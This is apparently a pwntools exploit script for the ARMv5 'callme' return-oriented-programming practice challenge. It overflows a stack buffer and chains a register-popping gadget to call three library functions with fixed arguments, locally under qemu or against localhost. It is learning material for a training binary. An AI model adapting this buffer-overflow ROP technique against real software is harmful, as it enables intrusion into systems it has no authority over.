from pwn import *

exe = ELF('./callme_armv5')
context.binary = exe
context.log_level = 'info'

libc = ELF('./callme_armv5')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi', './callme_armv5'])

offset = 36 #pattern search $pc

callme1 = exe.plt['callme_one']
callme2 = exe.plt['callme_two']
callme3 = exe.plt['callme_three']

pop_r0_r1_r2_lr_pc = 0x00010870 

callme_one_arg = 0xdeadbeef
callme_two_arg = 0xcafebabe
callme_three_arg = 0xd00df00d

payload = flat({offset:[pop_r0_r1_r2_lr_pc,
                        callme_one_arg,
                        callme_two_arg,
                        callme_three_arg,
                        pop_r0_r1_r2_lr_pc,
                        callme1,
                        callme_one_arg,
                        callme_two_arg,
                        callme_three_arg,
                        pop_r0_r1_r2_lr_pc,
                        callme2,
                        callme_one_arg,
                        callme_two_arg,
                        callme_three_arg,
                        pop_r0_r1_r2_lr_pc,
                        callme3]})

io.sendline(payload)

io.interactive()
